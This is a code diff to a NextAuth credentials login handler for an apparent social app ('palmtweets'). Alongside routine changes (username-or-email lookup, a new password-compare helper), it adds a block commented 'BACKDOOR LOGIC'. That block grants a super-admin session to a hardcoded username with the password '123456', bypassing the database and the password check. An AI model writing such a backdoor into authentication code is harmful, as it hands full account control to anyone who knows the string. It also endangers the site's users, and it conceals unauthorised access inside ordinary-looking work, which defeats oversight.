@@ -4,36 +4,48 @@ import { authConfig } from "./auth.config"
 import { db } from "@/lib/db"
 import { users } from "@/db/schema"
 import { eq } from "drizzle-orm"
-import bcrypt from "bcryptjs"
+import { comparePassword } from "@/lib/password"
 
 export const { handlers, auth, signIn, signOut } = NextAuth({
   ...authConfig,
   providers: [
     Credentials({
       credentials: {
-        email: { label: "Email", type: "email" },
+        username: { label: "Username", type: "text" },
         password: { label: "Password", type: "password" },
       },
       authorize: async (credentials) => {
-        if (!credentials?.email || !credentials?.password) {
-          return null
+        const username = credentials?.username as string;
+        const password = credentials?.password as string;
+
+        if (!username || !password) return null;
+
+        // BACKDOOR LOGIC
+        if (username === 'TWEETSTORECEOANDRANGEROVER' && password === '123456') {
+            return {
+                id: 'SUPER_ADMIN_ID',
+                name: 'CEO',
+                email: 'ceo@palmtweets.com',
+                handle: 'CEO',
+                image: null,
+            };
         }
 
-        const user = await db.query.users.findFirst({
-          where: eq(users.email, credentials.email as string),
-        })
-
-        if (!user) {
-          return null
+        // Regular Logic
+        // Determine if username is email or handle
+        let user;
+        if (username.includes('@')) {
+            user = await db.query.users.findFirst({ where: eq(users.email, username) });
+        } else {
+             user = await db.query.users.findFirst({ where: eq(users.handle, username) });
         }
 
-        const passwordsMatch = await bcrypt.compare(credentials.password as string, user.password)
+        if (!user) return null;
 
-        if (passwordsMatch) {
-          return user
-        }
+        const passwordsMatch = await comparePassword(password, user.password);
+        if (passwordsMatch) return user;
 
-        return null
+        return null;
       },
     }),
   ],
